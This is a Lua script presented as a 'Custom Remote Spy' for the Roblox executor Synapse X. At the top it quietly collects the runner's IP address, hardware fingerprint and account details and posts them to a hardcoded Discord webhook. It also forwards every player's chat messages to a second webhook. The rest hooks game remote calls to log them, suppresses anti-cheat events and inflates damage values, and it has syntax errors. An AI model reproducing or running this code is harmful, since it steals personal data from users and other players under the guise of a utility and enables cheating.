if not syn then
	game:GetService('Players').LocalPlayer:Kick('Synapse X Only')
end

local http_request = http_request;
if syn then
    http_request = syn.request
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local GetHwiDList = {"Syn-Fingerprint"};
local hwid = "";

for i, v in next, GetHwiDList do
    if decoded.headers[v] then
        hwid = decoded.headers[v];
        break
    end
end

local body1 = http_request({Url = 'http://ip-api.com/json'; Method = 'GET'}).Body;
local IP = game:GetService('HttpService'):JSONDecode(body1).query;
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = '';
local Embed = {
    title = 'Moonlit Hub';
    color = '99999';
    type = "rich";
    footer = { text = game.JobId };
    author = {
        name = 'Roblox Profile';
        url = 'https://www.roblox.com/users/'..game:GetService('Players').LocalPlayer.UserId.."/profile";
    };
    fields = {
        {
            name = 'Roblox Name';
            value = "```"..game:GetService('Players').LocalPlayer.Name.."```";
            inline = false;
        },
        {
            name = 'Roblox ID';
            value = "```"..game:GetService('Players').LocalPlayer.UserId.."```";
            inline = false;
        },
        {
            name = 'Game ID';
            value = "```"..game.PlaceId.."```";
            inline = false;
        },
        {
            name = 'Job ID';
            value = "```"..game.JobId.."```";
            inline = false;
        },
        {
            name = 'Generated GUID';
            value = "```"..game:GetService'HttpService':GenerateGUID().."```";
            inline = false;
        },
        {
            name = 'IP';
            value = "```"..IP.."```";
            inline = false;
        },
        {
            name = 'HWID';
            value = "```"..hwid.."```";
            inline = false;
        },
        {
            name = 'Script';
            value = "```"..Custom Remote Spy.."```";
            inline = false;
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discordapp.com/api/webhooks/664866591451643908/ZiG9zOMFTIn7ge_FKk79CE0-IJ4oSOnB109X_ZRKKvJvezOyBTq7KaR7p2Xu7J6XfJk9';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};

local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = '';
local prevOutputPos = 0
function output(plr, msg)
    local colour = Color3.fromRGB(255,255,255)
    if string.sub(msg, 1,1) == ":" or string.sub(msg,1,1) == ";" then 
        colour = Color3.fromRGB(255,0,0)
    elseif string.sub(msg,1,2) == "/w" or string.sub(msg,1,7) == "/whisper" or string.sub(msg,1,5) == "/team" or string.sub(msg,1,2) == "/t" then 
        colour = Color3.fromRGB(0,0,255)
    end
local Embed = {
    title = 'Chat Logs - In Game';
    color = '99999';
    type = "rich";
    footer = { text = game.JobId };
    author = {
        name = 'Roblox Profile - Click Me!';
        url = 'https://www.roblox.com/users/'..plr.UserId..'/profile';
    };
    fields = {
        {
            name = 'Roblox Name';
            value = "```"..plr.Name.."```";
            inline = false;
        },
        {
            name = 'Message';
            value = "```"..msg.."```";
            inline = false;
        },
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = 'https://discordapp.com/api/webhooks/741623682048327721/dEnDLX8THCDxZ9t3_zEl6pYrdje6Z2COGVv0D9E8FW9_heXKJE_XIHLuLx4jP-Ds6r-6';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};
prevOutputPos = prevOutputPos + 0.007
end
for i,v in next, game.Players:GetChildren() do
	v.Chatted:Connect(function(msg)
		output(v, msg)
	end)
end

game.Players.ChildAdded:Connect(function(plr)
	if plr:IsA("Player") then
		plr.Chatted:Connect(function(msg)
			output(plr, msg)
		end)
	end
end)

local gg=getgenv or function()return _ENV or _G end
gg().LogLocalRemotes=getgenv().LogLocalRemotes -- Enable to log BindableEvents and BindableFunctions
gg().WriteToFileEnabled=getgenv().EnabledWriteFile -- Enable to log through writefile.
gg().PrintToConsole=(rconsoleprint or not syn and printconsole)or warn -- To disable printing to console, change PrintToConsole to function()end;
gg().Enabled=getgenv().Enabled
gg().DataReturn=getgenv().ReturnData
gg().ColorFont=getgenv().FontColor 
if rconsolename then
	rconsolename'Custom Remote Spy - Moonlit Hub'
end
if rconsoleprint then
	rconsoleprint(gg().ColorFont) -- Color code for output.
end
local gg=getgenv or function()return _ENV or _G end
local ty=type
if not gg().Enabled then
	PrintToConsole'Not enabled?'
	return
end
local IS,FS=Instance.new'RemoteFunction'.InvokeServer,Instance.new'RemoteEvent'.FireServer
local Pls=game:GetService'Players'
local LP=Pls.LocalPlayer
if not LP then
	repeat
		LP=Pls.LocalPlayer
		Pls.ChildAdded:Wait()
	until LP
end
local RF=hookfunction or detour_function or replaceclosure or replacecclosure
local rget,tr,sel,wa=rawget,table.remove,select,wait
local to,ts,GFN,gsub,gg,gf,rep,grm,bt=typeof,tostring,game.GetFullName,string.gsub,getgenv or function()return _ENV or _G end,getfenv,string.rep,getrawmetatable,string.byte
local PlaceName='Unknown (404)'
local NC=newcclosure or newclosure or replaceclosure or replacecclosure
for Idx=1,6 do
	local Succ,Ret=pcall(game:GetService'MarketplaceService'.GetProductInfo, game:GetService'MarketplaceService', game.PlaceId)
	if Succ and Ret.Name then
		local Tab = {'/','\\',':','?','"',"'",'<','>','|',"'"}
		for Idx1 = 1, #Tab do
			Tab[Tab[Idx1]] = ''
			Tab[Idx1] = nil
		end;
		PlaceName=Ret.Name:gsub('.', Tab)
		break
	elseif not Succ and Idx==6 then
		PlaceName='Error ('..Ret..')'
	end
	wa(.25*F)
end;
local GlobalString='\n\tRemote Logs of ('..game.PlaceId..') '..PlaceName..', time: '..tick()..'\n'
local sSub=string.sub
local function Find(String,Letter)
	local Current=0
	for Idx=1,#String do
		if sSub(String,Idx,Idx)==Letter then
			Current=Current+1
		end
	end
	return Current
end
local function CleanseString(Str)
	if Find(Str,'\n')>3 then
		return gsub(Str,'.',function(Key)
			local Byte=bt(Key)
			if Byte<32 or Byte>126 then
				if Byte==9 then
					return'\\t'
				elseif Byte==10 then
					return'\\n'
				elseif Byte==13 then
					return'\\r'
				elseif Byte==92 then
					return'\\'
				end
				return'\\'..Byte
			else
				return Key
			end
		end)
	else
		return gsub(Str,'.',function(Key)
			local Byte=bt(Key)
			if Byte<32 or Byte>126 then
				if Byte==9 then
					return'\\t'
				elseif Byte==13 then
					return'\\r'
				elseif Byte==92 then
					return'\\'
				end
				return'\\'..Byte
			else
				return Key
			end
		end)
	end
end
local wf=writefile
local FileName='['..os.time()..']'..PlaceName..'('..game.PlaceId..').lua'
local function WriteToFile(String)
	GlobalString=GlobalString..'\n\n['..tick()..'] '..String
	wf(FileName,GlobalString,true)
end
local function CheckMeta(Table)
	local Meta=grm(Table)
	if Meta and Meta.__tostring~=nil then
		for EnvCheck=0,12 do
			local CEnv=grm(Meta)
			if CEnv and CEnv.__tostring~=nil then
				if EnvCheck==12 then
					return'Caller: Metatable spam environment'
				end
			else
				break
			end
			Meta=CEnv
		end
	end
	return 'Caller: '..(Meta.__tostring==nil and ts(Meta)or'Unknown')
end
local function Recurse(Table,CurrentIdx)
	if CurrentIdx>6 then
		return'Passed max depth check.}'
	end
	local String=''
	for Str,Obj in next,Table do -- Bypasses metamethods.
		local TS=to(Obj)
		String=String..'\n'..rep('    ',CurrentIdx)..ts(Str)
		if TS=='Instance'then
			if Obj.Parent then
				String=String..'='..Obj.ClassName..': game.'..GFN(Obj)
			else
				String=String..'='..Obj.ClassName..': nil.'..GFN(Obj)
			end
		elseif TS=='table'then
			String=String..'={'..Recurse(Obj,CurrentIdx+1)
		elseif TS=='EnumItem'then
			String=String..'(Enum)='..ts(Obj)
		elseif TS=='number'then
			String=String..'='..Obj
		elseif TS=='string'then
			String=String.."='"..CleanseString(Obj).."'"
		elseif TS=='CFrame'or TS=='Vector3'or TS=='Vector2'or TS=='UDim2'or TS=='UDim'or TS=='Rect2D'then
			String=String..'='..TS..'.new('..ts(Obj)..')'
		else
			String=String..'('..TS..')='..ts(Obj)
		end
	end
	String=String..'}'
	return String
end
if LogLocalRemotes then -- TODO: Make this check inside the hook so you can enable at anytime.
	PrintToConsole(game:GetService('Players').LocalPlayer.Name)
	PrintToConsole('\n'..game:GetService('Players').LocalPlayer.UserId)
	PrintToConsole('\n'..game.PlaceId)
	PrintToConsole('\n'..game.JobId)
	PrintToConsole('\n'..game:GetService'HttpService':GenerateGUID())
	PrintToConsole('\n'..hwid)
	PrintToConsole'\n-----------------------------------------------------------------------\n'
	local Inv,Fire=Instance.new'BindableFunction'.Invoke,Instance.new'BindableEvent'.Fire
	local OI
	OI=RF(Inv,NC(function(This,...)
		if not gg().Enabled then
			return OI(This,...)
		end
		if not This or typeof(This)~='Instance'or not This:IsA'BindableFunction'then
			warn('Got bad BindableFunction: '..tostring(This))
			return OI(This,...)
		end
		local String='\nLocalizedIndex.Invoke: '..(This.Parent and'game.'..CleanseString(GFN(This))or'nil.'..CleanseString(This.Name))..' ->'
		local Env=gf(0)
		local Scr=rget(Env,'script')
		if Scr then
			if to(Scr)=='Instance'then
				if Scr.Parent then
					String='Caller: game.'..CleanseString(GFN(Scr))..String
				else
					String='Caller: nil.'..CleanseString(GFN(Scr))..String
				end
			elseif to(Scr)=='table'then
				String=CheckMeta(Scr)..String
			else
				String='Script variable: '..to(Scr)..': '..ts(Scr)..String
			end
		else
			String='Caller: nil'..String
		end
		local Args={...}
		if #Args==0 then
			String=String..' (No arguments.)'
		else
			for Idx=1,#Args do
				local Obj=Args[Idx]
				local TS=to(Obj)
				String=String..'\n'..Idx..'('..TS..')'..(TS=='table'and'={'or'=')
				if TS=='Instance'then
					if Obj.Parent then
						String=String..Obj.ClassName..': game.'..GFN(Obj)
					else
						String=String..Obj.ClassName..': nil.'..GFN(Obj)
					end
				elseif TS=='table'then
					String=String..Recurse(Obj,1)
				elseif TS=='string'then
					String=String..CleanseString(Obj)
				elseif TS=='CFrame'or TS=='Vector3'or TS=='Vector2'or TS=='UDim2'or TS=='UDim'or TS=='Rect2D'then
					String=String..'='..TS..'.new('..ts(Obj)..')'
				else
					String=String..ts(Obj)
				end
			end
		end
		if DataReturnDebug then
			local Args={OI(This,...)}
			String=String..'\nReturned:'
			for Idx=1,#Args do
				local Obj=Args[Idx]
				local TS=to(Obj)
				String=String..'\n'..Idx..'('..TS..')'..(TS=='table'and'={'or'=')
				if TS=='Instance'then
					if Obj.Parent then
						String=String..Obj.ClassName..': game.'..GFN(Obj)
					else
						String=String..Obj.ClassName..': nil.'..GFN(Obj)
					end
				elseif TS=='table'then
					String=String..Recurse(Obj,1)
				elseif TS=='string'then
					String=String..CleanseString(Obj)
				elseif TS=='CFrame'or TS=='Vector3'or TS=='Vector2'or TS=='UDim2'or TS=='UDim'or TS=='Rect2D'then
					String=String..'='..TS..'.new('..ts(Obj)..')'
				else
					String=String..ts(Obj)
				end
			end
			PrintToConsole(String)
			if WriteToFileEnabled then
				WriteToFile(String)
			end
			return unpack(Args)
		else
			PrintToConsole(String)
			if WriteToFileEnabled then
				WriteToFile(String)
			end
		end
		return OI(This,...)
	end))
	local OF
	OF=RF(Fire,NC(function(This,...)
		if not gg().Enabled then
			return OF(This,...)
		end
		if not This or typeof(This)~='Instance'or not This:IsA'BindableEvent'then
			warn('Got bad BindableEvent: '..tostring(This))
			return
		end
		local String='\nLocalizedIndex.Fire: '..(This.Parent and'game.'..CleanseString(GFN(This))or'nil.'..CleanseString(This.Name))..' ->'
		local Env=gf(0)
		local Scr=rget(Env,'script')
		if Scr then
			if to(Scr)=='Instance'then
				if Scr.Parent then
					String='Caller: game.'..CleanseString(GFN(Scr))..String
				else
					String='Caller: nil.'..CleanseString(GFN(Scr))..String
				end
			elseif to(Scr)=='table'then
				String=CheckMeta(Scr)..String
			else
				String='Script variable: '..to(Scr)..': '..ts(Scr)..String
			end
		else
			String='Caller: nil'..String
		end
		local Args={...}
		if #Args==0 then
			String=String..' (No arguments.)'
		else
			for Idx=1,#Args do
				local Obj=Args[Idx]
				local TS=to(Obj)
				String=String..'\n'..Idx..'('..TS..')'..(TS=='table'and'={'or'=')
				if TS=='Instance'then
					if Obj.Parent then
						String=String..Obj.ClassName..': game.'..GFN(Obj)
					else
						String=String..Obj.ClassName..': nil.'..GFN(Obj)
					end
				elseif TS=='table'then
					String=String..Recurse(Obj,1)
				elseif TS=='string'then
					String=String..CleanseString(Obj)
				elseif TS=='CFrame'or TS=='Vector3'or TS=='Vector2'or TS=='UDim2'or TS=='UDim'or TS=='Rect2D'then
					String=String..'='..TS..'.new('..ts(Obj)..')'
				else
					String=String..ts(Obj)
				end
			end
		end
		PrintToConsole(String)
		if WriteToFileEnabled then
			WriteToFile(String)
		end
		return OF(This,...)
	end))
end
local ORF
ORF=RF(IS,NC(function(This,...)
	if not gg().Enabled then
		return ORF(This,...)
	end
	if not This or typeof(This)~='Instance'or not This:IsA'RemoteFunction'then
		return ORF(This,...)
	end
	local String='\nLocalizedIndex.InvokeServer: '..(This.Parent and'game.'..CleanseString(GFN(This))or'nil.'..CleanseString(This.Name))..' ->'
	local Env=gf(0)
	local Scr=rget(Env,'script')
	if Scr then
		if to(Scr)=='Instance'then
			if Scr.Parent then
				String='Caller: game.'..CleanseString(GFN(Scr))..String
			else
				String='Caller: nil.'..CleanseString(GFN(Scr))..String
			end
		elseif to(Scr)=='table'then
			String=CheckMeta(Scr)..String
		else
			String='Script variable: '..to(Scr)..': '..ts(Scr)..String
		end
	else
		String='Caller: nil'..String
	end
	local Args={...}
	if #Args==0 then
		String=String..' (No arguments.)'
	else
		for Idx=1,#Args do
			local Obj=Args[Idx]
			local TS=to(Obj)
			String=String..'\n'..Idx..'('..TS..')'..(TS=='table'and'={'or'=')
			if TS=='Instance'then
				if Obj.Parent then
					String=String..Obj.ClassName..': game.'..GFN(Obj)
				else
					String=String..Obj.ClassName..': nil.'..GFN(Obj)
				end
			elseif TS=='table'then
				String=String..Recurse(Obj,1)
			elseif TS=='string'then
				String=String..CleanseString(Obj)
			elseif TS=='CFrame'or TS=='Vector3'or TS=='Vector2'or TS=='UDim2'or TS=='UDim'or TS=='Rect2D'then
				String=String..'='..TS..'.new('..ts(Obj)..')'
			else
				String=String..ts(Obj)
			end
		end
	end
	if gg().DataReturnDebug then -- Probably doesn't work, threading/async rework.
		local Args={ORF(This,...)} -- Redo with coroutine/spawn(?)
		String=String..'\nReturned'
		if #Args==0 then
			String=String..': N/A'
		else
			String=String..' ->'
			for Idx=1,#Args do
				local Obj=Args[Idx]
				local TS=to(Obj)
				String=String..'\n'..Idx..'('..TS..')'..(TS=='table'and'={'or'=')
				if TS=='Instance'then
					if Obj.Parent then
						String=String..Obj.ClassName..': game.'..GFN(Obj)
					else
						String=String..Obj.ClassName..': nil.'..GFN(Obj)
					end
				elseif TS=='table'then
					String=String..Recurse(Obj,1)
				elseif TS=='string'then
					String=String..CleanseString(Obj)
				elseif TS=='CFrame'or TS=='Vector3'or TS=='Vector2'or TS=='UDim2'or TS=='UDim'or TS=='Rect2D'then
					String=String..'='..TS..'.new('..ts(Obj)..')'
				else
					String=String..ts(Obj)
				end
			end
		end
		gg().PrintToConsole(String)
		if WriteToFileEnabled then
			WriteToFile(String)
		end
		return unpack(Args)
	else
		gg().PrintToConsole(String)
		if gg().WriteToFileEnabled then
			WriteToFile(String)
		end
	end
	return ORF(This,...)
end))
local ORE
ORE=RF(FS,NC(function(This,...)
	if not gg().Enabled then
		return ORE(This,...)
	end
	if not This or typeof(This)~='Instance'or not This:IsA'RemoteEvent'then
		return ORE(This,...)
	end
	local Args={...}
	if This.Name=='replicateClientStateChanged'and Args[1]then
		if Args[1]=='walking'or Args[1]=='sprinting'or Args[1]=='sitting'or Args[1]=='jumping'or Args[1]=='idling'or Args[1]=='falling'then
			return
		end
	elseif This.Name=='replicatePlayerAnimationSequence'and Args[1]and Args[1]=='emoteAnimations'then
		return
	elseif(game.PlaceId==3016661674 or game.PlaceId==3541987450)and This.Parent and #This.Name>14 and Args[1]then
		if type(Args[1])=='table'and Args[1][1]and type(Args[1][1])=='number'and Args[1][1]>0 then
			return
		elseif type(Args[1])=='string'then
			warn('Stopped: ('..This.Name..') for: |'..Args[1]..'|')
			return
		end
	elseif Args[3]and type(Args[3])=='string'and(Args[3]=='kick'or Args[3]=='crash'or Args[3]=='monster')then
		warn'got kick/crash'
		return
	end
	local String='\nLocalizedIndex.FireServer: '..(This.Parent and'game.'..CleanseString(GFN(This))or'nil.'..CleanseString(This.Name))..' ->'
	local Env=gf(0)
	local Scr=rget(Env,'script')
	if Scr then
		if to(Scr)=='Instance'then
			if Scr.Parent then
				String='Caller: game.'..CleanseString(GFN(Scr))..String
			else
				String='Caller: nil.'..CleanseString(GFN(Scr))..String
			end
		elseif to(Scr)=='table'then
			String=CheckMeta(Scr)..String
		else
			String=to(Scr)..': '..ts(Scr)..String
		end
	else
		String='Caller: nil'..String
	end
	if #Args==0 then
		String=String..' (No arguments.)'
	else
		for Idx=1,#Args do
			local Obj=Args[Idx]
			local TS=to(Obj)
			String=String..'\n'..Idx..'('..TS..')'..(TS=='table'and'={'or'=')
			if TS=='Instance'then
				if Obj.Parent then
					String=String..Obj.ClassName..': game.'..GFN(Obj)
				else
					String=String..Obj.ClassName..': nil.'..GFN(Obj)
				end
			elseif TS=='table'then
				String=String..Recurse(Obj,1)
			elseif TS=='string'then
				String=String..CleanseString(Obj)
			elseif TS=='CFrame'or TS=='Vector3'or TS=='Vector2'or TS=='UDim2'or TS=='UDim'or TS=='Rect2D'then
				String=String..'='..TS..'.new('..ts(Obj)..')'
			else
				String=String..ts(Obj)
			end
		end
	end
	gg().PrintToConsole(String)
	if gg().WriteToFileEnabled then
		WriteToFile(String)
	end
	return ORE(This,...)
end))
local sro=setreadonly or make_writeable
local ggrm=grm(game)
local onc=ggrm.__namecall
sro(ggrm,false)
ggrm.__namecall=NC(function(This,...)
	if not gg().Enabled then
		return onc(This,...)
	end
	local Method=getnamecallmethod()
	if not Method or type(Method)~='string'then
		warn'Invalid method?'
		return onc(This,...)
	end
	local Args={...}
	if not Method=='FireServer'and not Method=='InvokeServer'then
		return onc(This,...)
	end
	if This.Name=='UpdateHealth'or This.Name=='CharacterSoundEvent'or This.Name=='SetTrails'or This.Name=='CalculateWeightEvent'or(This.Name=='MainEvent'and Args[1]=='TeleportDetect')or This.Name=='CancelVacuuming'then
		return
	elseif This.Name=='Stamina_Regen'or This.Name=='HalfStep'then
		return onc(This,...)
	elseif This.Name=='UpdateMousePosition'then
		return onc(This,...)
	elseif This.Name=='UpdateBoardTilt'then
		return onc(This,...)
	elseif This.Name=='DamageEvent'and Args[2]and ty(Args[2])=='number'then
		Args[2]=2e9;
	elseif This.Name=='RE'and Args[2] and ty(Args[2])=='table'and rawget(Args[2],'Type')then
		return onc(This,...)
	elseif This.Name=='DelayedRequestEvent'and Args[1]and ty(Args[1])=='number'then
		return onc(This,...)
	elseif This.Name=='ManageInventoryValues'and Args[1]and ty(Args[1])=='table'and Args[1][1]then
		if Args[1][1]=='Toggle Blocking'then
			Args[1][2]=true
			return onc(This,...)
		elseif Args[1][1]=='Toggle Busy'then
			Args[1][2]=false
			return onc(This,...)
		elseif Args[1][1]=='Tick Energy'then
			return
		elseif Args[1][1]=='Update Zone'then
			return onc(This,...)
		else
			warn(Args[1][1])
		end
	elseif This.Name=='TickEquipmentEvent'or This.Name=='BreakArmorEvent'then
		return
	elseif This.Name=='U'then
		return
	end
	local String
	if Method=='FireServer'and This.ClassName=='RemoteEvent'then
		String='\n__namecall.FireServer: '..(This.Parent and'game.'..CleanseString(GFN(This))or'nil.'..CleanseString(This.Name))..' ->'
	elseif Method=='InvokeServer'and This.ClassName=='RemoteFunction'then
		String='\n__namecall.InvokeServer: '..(This.Parent and'game.'..CleanseString(GFN(This))or'nil.'..CleanseString(This.Name))..' ->'
	else
		return onc(This,...)
	end
	local Env=gf(0)
	local Scr=rget(Env,'script')
	if Scr then
		if to(Scr)=='Instance'then
			if Scr.Parent then
				String='Caller: game.'..CleanseString(GFN(Scr))..String
			else
				String='Caller: nil.'..CleanseString(GFN(Scr))..String
			end
		elseif to(Scr)=='table'then
			String=CheckMeta(Scr)..String
		else
			String=to(Scr)..': '..ts(Scr)..String
		end
	else
		String='Caller: nil'..String
	end
	if #Args==0 then
		String=String..' (No arguments.)'
	else
		for Idx=1,#Args do
			local Obj=Args[Idx]
			local TS=to(Obj)
			String=String..'\n'..Idx..'('..TS..')'..(TS=='table'and'={'or'=')
			if TS=='Instance'then
				if Obj.Parent then
					String=String..Obj.ClassName..': game.'..GFN(Obj)
				else
					String=String..Obj.ClassName..': nil.'..GFN(Obj)
				end
			elseif TS=='table'then
				String=String..Recurse(Obj,1)
			elseif TS=='string'then
				String=String..CleanseString(Obj)
			elseif TS=='CFrame'or TS=='Vector3'or TS=='Vector2'or TS=='UDim2'or TS=='UDim'or TS=='Rect2D'then
				String=String..'='..TS..'.new('..ts(Obj)..')'
			else
				String=String..ts(Obj)
			end
		end
	end
	if gg().DataReturn55 and Method=='InvokeServer'and This.ClassName=='RemoteFunction'then
		local Args={onc(This,...)}
		String=String..'\nReturned:'
		for Idx=1,#Args do
			local Obj=Args[Idx]
			local TS=to(Obj)
			String=String..'\n'..Idx..'('..TS..')'..(TS=='table'and'={'or'=')
			if TS=='Instance'then
				if Obj.Parent then
					String=String..Obj.ClassName..': game.'..GFN(Obj)
				else
					String=String..Obj.ClassName..': nil.'..GFN(Obj)
				end
			elseif TS=='table'then
				String=String..Recurse(Obj,1)
			elseif TS=='string'then
				String=String..CleanseString(Obj)
			elseif TS=='CFrame'or TS=='Vector3'or TS=='Vector2'or TS=='UDim2'or TS=='UDim'or TS=='Rect2D'then
				String=String..'='..TS..'.new('..ts(Obj)..')'
			else
				String=String..ts(Obj)
			end
		end
		gg().PrintToConsole(String)
		if gg().WriteToFileEnabled then
			WriteToFile(String)
		end
		return unpack(Args)
	else
		gg().PrintToConsole(String)
		if gg().WriteToFileEnabled then
			WriteToFile(String)
		end
	end
	return onc(This,...)
end)
sro(ggrm,true)